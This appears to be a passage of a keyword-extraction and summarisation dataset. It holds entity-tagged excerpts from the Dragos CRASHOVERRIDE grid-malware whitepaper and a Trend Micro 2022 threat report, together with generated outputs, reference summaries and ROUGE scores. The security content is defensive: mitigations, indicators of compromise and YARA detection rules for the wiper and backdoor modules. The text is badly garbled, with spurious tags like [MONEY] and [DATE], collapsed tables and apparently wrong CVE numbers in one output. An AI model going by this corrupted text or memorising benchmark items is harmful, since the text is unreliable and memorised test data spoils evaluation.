[ORG] CRASHOVERRIDE is the [ORDINAL] second , out of [CARDINAL] four , [ORG] ICS tailored malware suite with OPC capabilities . OPC will appear abnormal in the [ORG] CRASHOVERRIDE usage as it is being used to scan all devices on the network which would generate more traffic than usual.\u2022 Robust backups of engineering files such as project logic , IED configura - tion files , and [ORG] ICS application installers should be offline and tested . This will help reduce the impact of the wiper functionality.\u2022 Prepare incident response plans for this attack and perform table top exer- cises bringing in appropriate stakeholders and personnel across engineer- ing , operations , IT , and security . The scenario should include substation outages with the requirement to do manual operations while recovering the [GPE] SCADA environment and gathering appropriate forensics.\u2022 The included [ORG] YARA rules and other indicators of compromise can be lever- aged to search for possible infections ( IOCs ) . The [ORG] YARA rules will provide a higher confidence towards discovering an infection than the other IOCs and should be searched for against [ORG] Windows [ORG] OT systems especially noting HMIs . The behavioral analytics to identify the communications on the network would provide the highest capability to detect this and similar threats.26While some defenses and architecture changes may have value in other situations , the following are responses that are not appropriate for this attack:\u2022 [ORG] Transmission and distribution companies should not rely on the usage of other protocols such as [ORG] DNP3 as a protection mechanism . The complete- ness of the [ORG] CRASHOVERRIDE framework suggests there may be other un- disclosed modules such as a [PRODUCT] DNP3 module . Also , adding this functionality into the existing framework would not require extensive work on the part of the adversary.\u2022 Air gapped networks , unidirectional firewalls , anti - virus in the [ORG] ICS , and other passive defenses and architecture changes are not appropriate solutions for this attack . No amount of security control will protect against a determined human adversary . Human defenders are required27Indicators C:\\Users\\<Public OR Executing User>\\ -ports=<ports > HostRegistry KeyHKLM\\SYSTEM\\CurrentControlSet\\Ser- vices\\<target_service_name>\\ImagePath < path to malware > HostSHA1 File HashF6C21F8189CED6AE150F9E- F2E82A3A57843B587DHostSHA1 File HashCCCCE62996D- 578B984984426A024D9B250237533Description Mutex value checked [ORG] Mutex value created [PERSON] File dropped and deleted after pro- gram exit Name given to service start [LAW] External [LAW] C2 server [ DEC 2016 ] ( likely [ORG] TOR node at time of attack ) External C2 server [ DEC 2016 ] ( likely [ORG] TOR node at time of attack ) External C2 server [ DEC 2016 ] ( likely [ORG] TOR node at time of attack ) Default user agent string used in C2 if unable to get system default user agent string [ORG] Command line arguments used to launch custom port scanner observed with malware . Command line logging required to track . Change in Service Image Path in the system registry to point to malware allowing malware to restart on system reboot . Traffic to < internalIP>:3128 , HTTP door / RAT . Traffic to < internalIP>:3128 , HTTP door / RAT.ICS Kill Chain Impact Stage 2 : Install Stage 2 : Install Stage 2 : [ORG] InstallRecon [ORG] Recon ReconStage 2 : C2 Stage 2 : C2Remote Access Remote AccessStage 2 : C2Remote AccessStage 2 : C2Remote AccessStage 2 : C2Remote AccessStage 2 : DevelopReconStage [CARDINAL] 2 : Installa- tionPersistencePhase2 : C2Remote AccessPhase2 : C2Remote AccessHostHostSHA1 File HashSHA1 File Hash8E39ECA1E48240C01EE570631AE8F- [CARDINAL] 0C9A9637187Backdoor / RAT Proxy + HTTP CON- 906016C8B5984D9Backdoor / RAT Proxy + HTTP CON- [PRODUCT] CFBD6AA7E57120AHostSHA1 [PRODUCT] File [PRODUCT] Hash94488F214B165512D2FC0438A581F- [PRODUCT] 5C9E3BD4D4CHostSHA1 [PRODUCT] File Hash5A5FAFBC3FEC8D36FD57B075EBF- [CARDINAL] 34119BA3BFF04HostSHA1 [ORG] File [ORG] HashB92149F046F00BB69DE329B8457D- 32C24726EE00HostHostHostHostHostHostSHA1 File [ORG] HashSHA1 [ORG] File [ORG] HashSHA1 [ORG] File HashFilenameB335163E6EB854DF5E08E85026B- opc.exeFilename61850.exeFilenamehaslo.exeHost OPC Group104.dll haslo.dat AabdulLauncher for payload [ORG] DLL . Takes input as [CARDINAL] three command line parameters \u2013 work- ing directory , module , and config file . Module for [CARDINAL] 104 effect . Exports ' Crash ' which is invoked by launcher . Functional- ity requires config file . [PERSON] Wiper module , wipes list of files by extension , removes system processes , and makes registry changes to prevent system boot . [PERSON] Wiper module , wipes list of files by extension , removes system processes , and makes registry changes to prevent system boot . Custom - built port scanner . OPC Data Access protocol enumeration of servers and addresses IEC-61850 enumeration and address manipulation [ORG] OPC [ORG] Data [ORG] Access protocol enumeration of servers and addresses IEC-61850 enumeration and address manipulation [PERSON] Wiper module , wipes list of files by extension , removes system processes , and makes registry changes to prevent system boot . IEC-104 module [PERSON] Wiper module OPC DA ModuleStage 2 : AttackLoss of ControlStage 2 : AttackLoss of ControlStage 2 : AttackDestructionStage 2 : AttackDestructionStage 2 : DevelopReconStage [CARDINAL] 2 : AttackLoss of ControlStage 2 : AttackLoss of ControlStage 2 : AttackLoss of ControlStage 2 : AttackLoss of ControlStage 2 : AttackDestructionStage 2 : Attack Stage 2 : Attack Stage 2 : AttackLoss of [ORG] Control [ORG] Destruction [ORG] Loss of [PERSON] VisibilityYara [PERSON] Rules Also found at url \u201c pe \u201d import \u201c hash\u201drule dragos_crashoverride_exporting_dlls condition : pe.exports(\u201cCrash \u201d ) & pe.characteristicsdescription = \u201c [WORK_OF_ART] CRASHOVERRIDE [WORK_OF_ART] v1 [WORK_OF_ART] Suspicious [WORK_OF_ART] Export \u201d author = \u201c [WORK_OF_ART] Dragos [WORK_OF_ART] Inc\u201ddescription = \u201c [WORK_OF_ART] CRASHOVERRIDE [WORK_OF_ART] v1 [WORK_OF_ART] Wiper \u201d author = \u201c [WORK_OF_ART] Dragos [WORK_OF_ART] Inc\u201drule [WORK_OF_ART] dragos_crashoverride_suspcious condition:$s0 = \u201c SYS_BASCON.COM \u201d fullword nocase wide $ [MONEY] s1 = \u201c .pcmp \u201d fullword nocase wide $ s2 = \u201c .pcmi \u201d fullword nocase wide $ [MONEY] s3 = \u201c .pcmt \u201d fullword nocase wide $ [MONEY] s4 = \u201c .cin \u201d fullword nocase widepe.exports(\u201cCrash \u201d ) and any of ( $ s*)30YARA Rulesmeta : condition : rule dragos_crashoverride_name_search { } description = \u201c [WORK_OF_ART] CRASHOVERRIDE [WORK_OF_ART] v1 [WORK_OF_ART] Suspicious [WORK_OF_ART] Strings [WORK_OF_ART] and [WORK_OF_ART] Export \u201d author = \u201c [WORK_OF_ART] Dragos [WORK_OF_ART] Inc\u201d$s0 = \u201c [CARDINAL] 101.dll \u201d fullword nocase wide $ [MONEY] s1 = \u201c Crash101.dll \u201d fullword nocase wide $ s2 = \u201c [CARDINAL] 104.dll \u201d fullword nocase wide $ [MONEY] s3 = \u201c Crash104.dll \u201d fullword nocase wide $ [MONEY] s4 = \u201c 61850.dll \u201d fullword nocase wide $ s5 = \u201c Crash61850.dll \u201d fullword nocase wide $ [MONEY] s6 = \u201c OPCClientDemo.dll \u201d fullword nocase wide $ [MONEY] s7 = \u201c OPC \u201d fullword nocase wide $ s8 = \u201c CrashOPCClientDemo.dll \u201d fullword nocase wide $ [MONEY] s9 = \u201c D2MultiCommService.exe \u201d fullword nocase wide $ s10 = \u201c CrashD2MultiCommService.exe \u201d fullword nocase wide $ s11 = \u201c 61850.exe \u201d fullword nocase wide $ s12 = \u201c OPC.exe \u201d fullword nocase wide $ s13 = \u201c haslo.exe \u201d fullword nocase wide $ s14 = \u201c haslo.dat \u201d fullword nocase wideany of ( $ [MONEY] s * ) and pe.exports(\u201cCrash\u201d)31YARA Rulesrule dragos_crashoverride_hashes { meta : description = \u201c [WORK_OF_ART] CRASHOVERRIDE [WORK_OF_ART] Malware [WORK_OF_ART] Hashes \u201d author = \u201c [WORK_OF_ART] Dragos [WORK_OF_ART] Inc \u201d condition : filesize < 1 MB and } [CARDINAL] 32YARA Rulesrule dragos_crashoverride_moduleStrings { condition : any of ( $ s*)description = \u201c IEC-104 [ORG] Interaction [ORG] Module [ORG] Program [ORG] Strings \u201d author = \u201c [WORK_OF_ART] Dragos [WORK_OF_ART] Inc\u201d$s1 = \u201c IEC-104 client : [PERSON] ip=%s ; [DATE] port=%s ; ASDU=%u \u201d nocase wide ascii $ s2 = \u201c [WORK_OF_ART] MSTR - > > [WORK_OF_ART] SLV \u201d nocase wide ascii $ s3 = \u201c MSTR < < - SLV \u201d nocase wide ascii $ [MONEY] s4 = \u201c Unknown APDU format ! ! ! \u201d nocase wide ascii $ s5 = \u201c iec104.log \u201d nocase wide asciirule dragos_crashoverride_configReader description = \u201c CRASHOVERRIDE v1 [PERSON] Config [PERSON] File [PERSON] Parsing \u201d author = \u201c [ORG] Dragos [ORG] Inc \u201d strings : $ s0 = { [CARDINAL] 68 e8 ? ? ? ? ? ? 6a 00 e8 a3 ? ? ? ? ? ? [CARDINAL] 8b f8 [CARDINAL] 83 c4 ? [CARDINAL] 8 } $ s1 = { [CARDINAL] 8a [CARDINAL] 10 3a 11 75 ? ? [CARDINAL] 84 d2 74 12 } $ s2 = { [CARDINAL] 33 c0 eb ? ? [CARDINAL] 1b c0 [CARDINAL] 83 c8 ? ? } $ [MONEY] s3 = { [CARDINAL] 85 c0 75 ? ? 8d [CARDINAL] 95 ? ? ? ? ? ? ? ? [CARDINAL] 8b cf ? ? ? ? } condition : all of them } [CARDINAL] 33YARA [NORP] Rulesrule dragos_crashoverride_weirdMutex description = \u201c [PRODUCT] Blank mutex creation assoicated with CRASHOVERRIDE \u201d author = \u201c [ORG] Dragos [ORG] Inc \u201d strings : $ [MONEY] s1 = { [CARDINAL] 81 ec 08 02 00 00 57 33 ff [CARDINAL] 57 [CARDINAL] 57 [CARDINAL] 57 ff [CARDINAL] 15 ? ? ? ? 40 00 a3 ? ? ? ? ? ? 00 [CARDINAL] 85 c0 } $ s2 = { 8d 85 ? ? ? ? ? ? ff [DATE] 50 [DATE] 57 [DATE] 57 6a 2e [CARDINAL] 57 ff [CARDINAL] 15 ? ? ? ? ? ? 00 68 ? ? ? ? 40 00 } condition : all of them description = \u201c Identify service hollowing and persistence setting \u201d author = \u201c [ORG] Dragos [ORG] Inc \u201d strings : $ s0 = { [CARDINAL] 33 c9 51 51 51 51 51 51 ? ? ? ? ? ? } $ [MONEY] s1 = { [CARDINAL] 6a ff [CARDINAL] 6a ff [CARDINAL] 6a ff [CARDINAL] 50 ff [DATE] 15 [DATE] 24 ? ? 40 00 ff ? ? ? ? ff [DATE] 15 [DATE] 20 ? ? 40 00 } condition : all of them } [CARDINAL] 34YARA Rulesrule dragos_crashoverride_wiperModuleRegistry description = \u201c [WORK_OF_ART] Registry [WORK_OF_ART] Wiper functionality assoicated with CRASHOVERRIDE \u201d author = \u201c [ORG] Dragos [ORG] Inc \u201d strings : $ s0 = { 8d 85 a0 ? ? ? ? ? ? [CARDINAL] 46 [CARDINAL] 50 [CARDINAL] 8d 85 a0 ? ? ? ? ? ? [CARDINAL] 68 [CARDINAL] 68 0d ? ? ? ? [CARDINAL] 50 } $ s1 = { 6a 02 68 78 0b ? ? ? ? 6a 02 50 68 b4 0d ? ? ? ? ff b5 98 ? ? ? ? ? ? ff [DATE] 15 [DATE] 04 ? ? ? ? ? ? } $ s2 = { [DATE] 68 [DATE] 00 02 00 00 8d 85 a0 ? ? ? ? ? ? [CARDINAL] 50 [CARDINAL] 56 ff b5 [CARDINAL] 9c ? ? ? ? ? ? ff [DATE] 15 [DATE] 00 ? ? all of them description = \u201c File manipulation actions associated with CRASHOVERRIDE wip- er \u201d author = \u201c [ORG] Dragos [ORG] Inc \u201d strings : $ s0 = { 6a 00 68 80 00 00 00 [CARDINAL] 6a 03 6a 00 6a 02 [CARDINAL] 8b f9 68 00 00 00 40 [CARDINAL] 57 ff [CARDINAL] 15 [CARDINAL] 1c ? ? ? ? ? ? [CARDINAL] 8b d8 } $ s2 = { [CARDINAL] 6a [CARDINAL] 00 50 57 56 53 ff [CARDINAL] 15 [CARDINAL] 4c ? ? ? ? ? ? [CARDINAL] 56 } condition : all of them } [CARDINAL] 35", "generated_text": "CRASHOVERRIDE; the threat; electric grid operations; 2016; the Kiev, Ukraine transmission substation; Ukraine; CVE-2015-5374; the malware; PowerShell; a DNP3 protocol stack; the attackers; a backdoor; data; Wiper; OPC; network communications; CVE-2015-10374; CVE-2015-204; a denial; visibility; commands; the ICS; the attackers; the Ukrainian government; the Ukrainian government; the threat; a compromise; the electric grid; Neutrality; the threat.", "ref_text": "<START-1>The whitepaper provides an analysis of the CrashOverride malware framework used in the December 2016 cyberattack that caused a blackout in Ukraine. CrashOverride is modular malware tailored for attacking electric grid operations. Its components include an initial backdoor, a launcher, payloads, and a wiper module. The backdoor provides access to infected hosts. The launcher loads ICS-specific payload modules that manipulate grid operations. The wiper disrupts systems after payloads execute. The payload modules implement grid communications protocols like IEC 104, IEC 61850, and OPC DA to interact with grid devices. This allows CrashOverride to monitor, send unauthorized commands, and spoof normal operations. It can open breakers to de-energize substations and manipulate protective relays. CrashOverride evolves previous ICS malware tradecraft by codifying knowledge of grid operations into reusable modules. It can be adapted to target facilities in Europe and some parts of the Middle East and Asia. Expanding protocol support would allow broader targeting. While CrashOverride cannot cause widespread grid failure, coordinated attacks could result in regional outages over multiple days. However, grid defenses like human monitoring and redundancy provide resilience against such attacks. Recommended mitigations include monitoring for protocol anomalies, robust backups, and incident response planning. In summary, the whitepaper provides a technical analysis of the CrashOverride malware's modular framework, grid-specific payloads, and potential to cause disruptive attacks against electric utilities. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3894736842105263, "gpt3/lexical/rouge_rouge2": 0.12169312169312169, "gpt3/lexical/rouge_rougeL": 0.2, "gpt3/lexical/rouge_rougeLsum": 0.2, "gpt3_generated_text": ["This article discusses the analysis of the CRASHOVERRIDE malware and its threat to electric grid operations. The malware, which was used in the cyber-attack on the Kiev, Ukraine transmission substation in 2016, is the first ever malware framework designed to attack electric grids. It is not unique to any particular vendor or configuration and can be immediately re-purposed in Europe, the Middle East, and Asia. The article highlights the potential implications of the malware and its ability to cause outages for hours or potentially a few days. The malware serves no espionage purpose and its only feature is to cause electric outages. The article also mentions the possibility of the malware being extended to other industries, but notes that the attackers have not demonstrated the knowledge of other physical industrial processes. The article concludes by stating that the CRASHOVERRIDE malware is linked to the Sandworm team and provides information for defense and impact awareness."]}, {"split_name": "test", "sample_id": "test_114", "prompt_text": "Extract the keywords: ContentsCybercriminals Are Using Corporate Tactics 04Access is [ORG] Key [ORG] for [ORG] Threat [ORG] Actors 06The Attack Surface is Expanding and Patches are [ORG] Failing [ORG] 08Weak [ORG] Points [ORG] Spotted in the Cloud 14The Business Impact of Cybersecurity Attacks 18Strategies for [ORG] Defending [ORG] Against [ORG] an [ORG] Increasingly [ORG] Tactical [ORG] Adversary 20Threat Landscape 21Published by [ORG] Trend [ORG] Micro [ORG] ResearchStock image used under license from Shutterstock.comThe year 2022 was defined by volatile political conflict and economic instability . The war in [GPE] Ukraine and the escalating events surrounding the conflict sent shockwaves throughout the globe . For many governments , major enterprises , and even smaller organizations , there were disrupted supply chains , setbacks in critical multinational industries , and economic repercussions . Like many organizations operating in this unstable environment , cybercriminals groups tried to adapt and carry on as usual . In our report on the security landscape of [DATE] the [DATE] past [DATE] year , we show how groups adjusted to modernized enterprise security , shifted to more lucrative corporate targets , and focused on new ways to access victims \u2019 networks . In the following sections , we discuss corporate tactics that cybercriminals use to keep their business successful amid declining revenue . We dive into ransomware groups specifically and show how modern groups are taking hints from legitimate businesses when it comes to image management and corporate programs . We also look at the state of vulnerabilities , especially how threat actors entered networks in [DATE] 2022 . We saw that access is key . No matter what type of malicious actor , gaining initial access into a victim \u2019s network is a necessity . These groups learn from each other , and often move in the same manner , just with different end goals . [CARDINAL] One major security move in [DATE] 2022 was [ORG] Microsoft \u2019s decision to block the execution of macros in their [ORG] Office documents . We look at how this affected threat actor \u2019s initial access tactics , and how criminal groups have adjusted to this move . Calling back to our mid [DATE] - [DATE] year security report , we saw how the attack surface continued to expand , allowing threat actors more avenues for access . We also saw how enterprise patches seemed to be less effective in [DATE] 2022 , an added factor to recurring cybersecurity problems plaguing businesses . Looking deeper into enterprise security , we investigated weak points in serverless computing security since many cloud service providers ( CSPs ) have been quick to adopt this technology . [DATE] The [DATE] past [DATE] year also saw a rise in malicious actors targeting cloud infrastructure for their cryptocurrency mining , trying to take over more resources for more lucrative mining activities . This is particularly critical in a time where there is a shortage of cybersecurity experts \u2014 many organizations are still seeking skilled security professionals . According to a report by consultation firm McKinsey , there were [CARDINAL] 3.5 [CARDINAL] million cybersecurity positions still open1 in [DATE] the [DATE] first [DATE] quarter [DATE] of [DATE] 2022 . We hope that existing security teams , enterprise leaders , and others can use the information presented in this report to harden their cybersecurity defenses against present threats . A robust and extensive security strategy should be a priority as the attack surface continues to expand and threat actors continue to grow more sophisticated . Cybercriminals Are Using Corporate TacticsThe current state of ransomware2 shows how operators behind this threat have been quick to broaden their scope of attack in the face of declining returns . Recent reports say that ransomware revenue from victim payouts is waning , with a 38 % decrease from [DATE] 2021 to [CARDINAL] 2022.3 But what has kept this threat alive ? In [DATE] recent [DATE] years , it has become clear that the thriving ransomware organizations have adopted tactics from the same corporate handbook that legitimate multinational companies use . Rebranding and Image ManagementMany of these groups have structured their organizations that operate like legitimate businesses , including leveraging established networks4 and offering technical support5 to victims . We have been seeing an increasing level of professionalism from these groups , and the adoption of more sophisticated business tactics . This was particularly clear in [DATE] 2022 , when we saw one of the biggest players among ransomware groups rebrand after an image crisis . [PERSON] Conti was [CARDINAL] one of the most active and prominent ransomware families in recent years6 , but after a string of high - profile attacks in [DATE] 2022 and conspicuous affiliation with [GPE] Russia , the brand was labeled \u2018 toxic\u2019.7 [ORG] Conti \u2019s operations were effectively shut down [DATE] mid-2022 , however , former members of the previous group emerged rebranded as several new groups : [PERSON] Black [PERSON] Basta , [PERSON] BlackByte , [PERSON] Karakurt , and [ORG] Royal . This rebranding was a well - planned move , and reports8 say [PERSON] Conti planned a string of public attacks as publicity for their reincarnation as smaller operations . Diversifying Their PortfolioIn 2022 we saw ransomware groups like [PRODUCT] Agenda , [ORG] BlackCat , Hive , and [ORG] RansomExx develop versions of their ransomware in [ORG] Rust.9 [ORG] This cross - platform language allows groups to customize malware for operating systems like [PRODUCT] Windows and Linux which are widely used by businesses . As we mentioned in our mid [DATE] - [DATE] year roundup,10 ransomware actors are now moving beyond [WORK_OF_ART] Windows [WORK_OF_ART] and [WORK_OF_ART] MacOS and targeting Linux . The shift to Rust is another technique being adopted by ransomware actors to make it easier for them to target Linux machines . Rust is more difficult to analyze and has a lower detection rate by antivirus engines , making it more appealing to threat actors . OS20212022LinuxMacOS3,79015,15427,60211,000Table [CARDINAL] 1 . Ransomware operating system ( OS ) comparison countsIn [DATE] recent [DATE] years , we saw how modern ransomware groups use the double extortion [PERSON] technique11 as added pressure for victims to pay ransom . [DATE] Last [DATE] year , our investigations showed that ransomware groups were building up new revenue [PERSON] streams12 using their existing business structure and tools . For instance , the BlackCat13 ransomware was seen using an upgraded version of the ExMatter data exfiltration tool and [NORP] Eamfo , a malware designed to steal credentials . Page [CARDINAL] 4 of 27Shifting to monetization of exfiltrated data would be easy for ransomware groups \u2014 many of the current RaaS organizations can capitalize on the tools they already have . We expect that in the future , the groups will also adopt other criminal business models14 that monetize initial access , such as stock fraud , business email compromise ( [ORG] BEC ) , money laundering , and cryptocurrency theft , among others . [ORG] LateralmovementSensitivedata ex\ufb01ltrationPrimary extortionmethodsInitial accessRansomware deploymentMoneylaunderingPrivilege escalationBackupsystems \u2019 disruptionSecondaryextortion methodsFigure [CARDINAL] 1 . Example of new modern ransomware business modelThese organizations are becoming jacks - of - all - trade , using their established business structure and extensive arsenal of tools to expand into new ventures . They are not tying themselves down to [CARDINAL] one method of attack , [CARDINAL] one entry vector , or [CARDINAL] one revenue stream . [ORG] Ransomware group [ORG] LockBit 3.0 introduced the [ORDINAL] first ransomware bug bounty program . [PERSON] Bug [PERSON] bounties15 are usually set by technology companies to crowdsource vulnerabilities . Rewards are offered to researchers who report bugs , so companies can patch them . In [DATE] 2022 , we saw that the ransomware group was using the same tactic for their malware . New ransomware tactics in [CARDINAL] 2022Page [CARDINAL] 5 [CARDINAL] of [CARDINAL] 27Access is [ORG] Key [ORG] for [ORG] Threat [ORG] ActorsRegardless of the type of threat actor , they go through the same motion of gaining access to the target \u2019s environment . This is highlighted by the top [CARDINAL] three MITRE Attack techniques that we saw in [DATE] 2022 . These techniques show the standard operating procedure for most threat actors . No matter the type of attacker , the initial phases of their attack do not technically look different.2022 Top Three MITRE TechniquesRemote Services , Technique T1021 \u2013 Enterprise | MITRE ATT&CK \u00ae (Lateral [PERSON] Movement)\u2014Adversaries may use [ORG] Valid [ORG] Accounts to log into a service specifically designed to accept remote connections , such as telnet , [ORG] SSH , and [ORG] VNC . The adversary may then perform actions as the logged - on user . [PERSON] Valid [PERSON] Accounts , Technique T1078 \u2013 Enterprise | MITRE ATT&CK \u00ae (Initial Access)\u2014Adversaries may obtain and abuse credentials of existing accounts as a means of gaining [ORG] Initial [ORG] Access , Persistence , [ORG] Privilege [ORG] Escalation , or Defense Evasion . Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services . OS Credential Dumping , Technique T1003 \u2013 Enterprise | MITRE ATT&CK \u00ae (Credential Access)\u2014Adversaries may attempt to dump credentials to obtain account login and credential material , normally in the form of a hash or a clear text password , from the operating system and software . Credentials can then be used to perform [ORG] Lateral [ORG] Movement and access restricted information . The top [CARDINAL] three attack techniques indicate that threat actors getting access through remote services , and then they proceed to expand their footprint within the environment by utilizing valid accounts through credential dumping . [ORG] Microsoft \u2019s Major [PERSON] Move in 2022The most popular initial access vector for [DATE] the [DATE] past [DATE] seven [DATE] years has been [ORG] Microsoft [ORG] Office documents with embedded malicious macros . These documents were usually attached to an email with a social engineering message enticing the victim to open it . If opened , the malicious macro downloads and executes malware that grants the threat actor initial access . However , in early [DATE] 2022 [ORG] Microsoft decided to block the execution of macro programs on Office documents . Specifically , they blocked those downloaded from the internet , including the macros attached in emails . This single action changed everything for threat actors . No longer able to use [ORG] Microsoft macros , the threat actors started searching for and using alternative vectors . Page 6 of 27Alternatives to [ORG] Microsoft [ORG] MacrosSome of the alternative initial access vectors we tracked included HTML smuggling16 and malvertising.17 In [DATE] late [DATE] 2022 , we identified a growing list of popular brands and applications whose keywords were hijacked to display malicious ads ( a case of malvertising ) . For example , a Google search for \u201c [WORK_OF_ART] Adobe [WORK_OF_ART] Reader \u201d will show an advertisement that leads to a malicious site . HTML smuggling is an initial access vector that uses email . The basic idea is to use a malicious HTML file as an attachment . When opened , the HTML file \u201c smuggles \u201d a ZIP file which contains an [ORG] ISO file with a [ORG] LNK file in it that will load the malware payload . It is a cumbersome method , but that payload will grant the threat actor initial access . We also saw how cybercriminals were \u201c living off the land \u201d ( abusing valid systems and tools ) more in [DATE] 2022 . Specifically we noted that legitimate pentesting tools [PERSON] Cobalt [PERSON] Strike and [ORG] Brute [ORG] Ratel were used in malicious attacks.18 A cybercriminal that uses these pentesting tools and built - in operating system tools within a short timeline is a dangerous threat . TimeActivitiesT - zeroInitial access gained through HTML smuggling+16 [CARDINAL] minutesCnC communication and early reconnaissance+5 minutesBrute [ORG] Ratel is dropped+5 minutesUse of built - in OS tools for reconnaissance+10 minutesAC reconnaissance using another tool+7 minuteslateral movement via [ORG] CobaltStrike startsTable [CARDINAL] 2 . Example of an attack timeline using legitimate pentesting toolsPage [CARDINAL] 7 of 27The Attack Surface is Expanding and Patches are FailingThreat actors have long been learning from one another , so much so that they act and move in generally the same way . However , there are some variations in their tools and preferences ( depending on availability ) and perhaps how their networked environment is set up . Top Vulnerabilities Used in [CARDINAL] 2022In terms of top vulnerabilities seen in [DATE] 2022 we saw a move from the [ORG] Microsoft - focused common vulnerabilities and exposures ( CVEs ) to [ORG] Log4J19 CVEs . This is likely related to the major change [ORG] Microsoft made , which was discussed in the previous section . Developers use Log4j as a journal to keep track or log the activity of a system or application . In [DATE] 2021 , several vulnerabilities were highly publicized20 and we saw that threat actors took advantage of that in [CARDINAL] 2022.2021 Top 3 CVEs2022 Top [CARDINAL] 3 CVEsNVD \u2013 CVE-2021 [ORG] - 26855 ( nist.gov ) NVD \u2013 CVE-2021 [ORG] - 27065 ( nist.gov ) NVD \u2013 CVE-2020 - 0688 ( nist.gov)NVD \u2013 CVE-2021 [ORG] - 44228 ( nist.gov ) NVD \u2013 CVE-2021 [ORG] - 45015 ( nist.gov ) NVD \u2013 CVE-2021 [ORG] - 45046 ( nist.gov)All of these are [ORG] Microsoft [ORG] Exchange vulnerabilitiesThree of them are Log4J vulnerabilities , [CARDINAL] one is relatively obscureTable [CARDINAL] 3 . Top [CARDINAL] three CVEs in [DATE] 2021 compared to [CARDINAL] 2022There are a few notable points when we look into the top CVEs in 2022:\u2022\u2022\u2022The CVEs can be exploited publicly by a threat actor . There are many dissections , write - ups , and analysis available . They are highly successful , with a base score of HIGH / CRITICAL . The attack vector can be performed via network , the complexity is low , and almost no existing privilege is required to exploit without user interaction ( this means attacks can be automated).They have been reported in the news and are primed for use . There are lists of vendors ( or customer bases ) that have been affected . It is a known target pool that threat actors can draw from . Threat actors are typically updated with the latest vulnerabilities and are well - aware of the CVEs that they can use for their activities . It is up to security experts and users to be ahead of the threat actors and implement fixes to vulnerabilities before they can be exploited . As much as the vulnerabilities and weaknesses threat actors use can be similar , their motives may vary . Their end goals could be data collection and exfiltration , ransomware , cryptocurrency mining , or other malicious actions . We also looked at data from [ORG] Trend [ORG] Micro \u2122 [ORG] Deep [ORG] Security \u2122 ( DS ) for a yearly total of vulnerability - related events , and we saw similar results to our mid [DATE] - [DATE] year report . A vulnerability ( CVE-2017 [ORG] - 14495 ) affecting dnsmasq had the highest number of detected events . This is unsurprising considering it is a popular free software that can be configured as a [ORG] DNS , a [ORG] DHCP ( Dynamic Host Configuration Protocol ) , and a [GPE] TFTP ( Trivial File Transfer Protocol ) server . It is mainly used in routers and internet of things ( [ORG] IoT ) gateways . Page [CARDINAL] 8 of 27The other vulnerabilities with high detection counts were varied . CVE-2021 [ORG] - 44228 is an [PRODUCT] Apache [PRODUCT] Log4j vulnerability that we mentioned in the previous section , and CVE-2006 - 4154 is another vulnerability that affects [PRODUCT] Apache . Again , we see that threat actors are targeting widely used free technology essential to many businesses . Like dnsmasq , [PRODUCT] Apache is also a free software and it runs on 67 % of all websites in the world.21Filter IDSolutionRelated CVEsDetection EventCounts1009667Deep SecurityCVE-2017 - 14495149,584,000,0001011242Deep SecurityCVE-2021 - 4422811,766,751,5651000853Deep SecurityCVE-2006 - 41545,667,326,5281004398Deep SecurityCVE-2010 - 27301,970,505,7931010971Deep SecurityCVE-2021 - [CARDINAL] 294411011466Deep SecurityCVE-2022 - [CARDINAL] 305221006027Deep SecurityCVE-2014 - 00981011456Deep SecurityCVE-2022 [ORG] - 2613410112651011492Deep SecurityCVE-2021 - [CARDINAL] 45046Deep SecurityCVE-2022 - 301361,936,302,0171,518,554,891871,076,092533,046,544269,500,708169,278,618Table 4 . The number of detected vulnerability - related events based on [ORG] Trend [ORG] Micro \u2122 [ORG] Deep [ORG] Security \u2122 and [ORG] Trend [ORG] Micro [ORG] Apex [CARDINAL] One \u2122 data in 2022Spring4Shell CVE-2022 - 22965 - CVSS rating : 9.8CVE-2022 [CARDINAL] - 22965 is a critical bug that affects [ORG] the [ORG] Spring [ORG] Framework,22 which is used to develop enterprise - level applications in [PERSON] Java . We first started seeing this vulnerability in [DATE] April [DATE] 2022 and investigations show that it allows malicious actors to weaponize and execute the [ORG] Mirai botnet malware . Log4Shell CVE-2021 [ORG] - 44228 [ORG] - [ORG] CVSS rating : 10.0CVE-2021 [MONEY] - 44228 is a critical flaw found in [ORG] Apache [ORG] Log4j which is a widely used [PERSON] Java - based logging library . National defense agencies across the world issued warnings23 about this bug because of attacks observed in the wild . This was [ORDINAL] first reported in [DATE] 2021 , and the security issues continued into [CARDINAL] 2022.Vulnerability SpotlightPage 9 of 27Record Breaking Numbers for ZDIAdvisories from the Trend Micro \u2122 Zero Day Initiative \u2122 ( ZDI ) have kept rising , and [MONEY] 2022 [MONEY] marks their [ORDINAL] third record - breaking year . The reported [CARDINAL] 1,706 advisories are the most ever in the history of the program . We see [CARDINAL] two reasons for the steady increase of published advisories . [ORDINAL] First , the attack surface has increased exponentially , so there are more bugs to be found . The other factor is that ZDI itself has invested in automating analysis , which has resulted in many more bugs found by researchers . Comparing the severity of the reported common vulnerabilities and exposures ( [ORG] CVE ) , we see that from [DATE] 2021 the number of critical bugs doubled in [DATE] 2022 , though it did not reach the heights of critical bugs in [CARDINAL] 2020.1,200983187 1,4531,13826414854 2021 1,6041,191228 1,706CriticalHighMediumLowFigure 2 . Comparison of number and severity of advisories across [DATE] 2020 , [DATE] 2021 , and [CARDINAL] 2022After examining the vulnerabilities themselves , we did not see any big shifts in the types of bugs . However , we did see an increase in failed patches.24 Organizations may not have the time or resources to create comprehensive solutions , simply pushing out quick fixes instead of addressing root issues . Not only that , but companies also seem to be disclosing less specific information in their public alerts about their vulnerabilities . This gives other businesses and security heads less information to work with when applying the patches . Page [CARDINAL] 10 of 27271AdobeMicrosoftBentleyAutodeskSAP1441241061019292PDF - XchangeSiemensAdvantech65Oracle61Foxit57 Trend Micro45Wecon45Apple33Delta Industrial33D - Link 27Cisco 25Linux Kernel15OthersThe ZDI program wasresponsible for [PERCENT] over 70 % of [ORG] Adobe bugs \ufb01xed last year.3700100200300400Figure [CARDINAL] 3 . Published security advisories per vendor for 2022CWE-125 Out - of - bounds ReadCWE-787 Out - of - bounds [PERSON] WriteCWE-416 [PERSON] Use After FreeCWE-121 Stack - based [ORG] Bu\ufb00er Over\ufb02owCWE-122 Heap - based [ORG] Bu\ufb00er [ORG] Over\ufb02ow CWE-89 [ORG] Improper [ORG] Neutralization [ORG] of [ORG] Special [ORG] Elements used in an [ORG] SQL [ORG] Command CWE-59 [WORK_OF_ART] Improper [WORK_OF_ART] Link 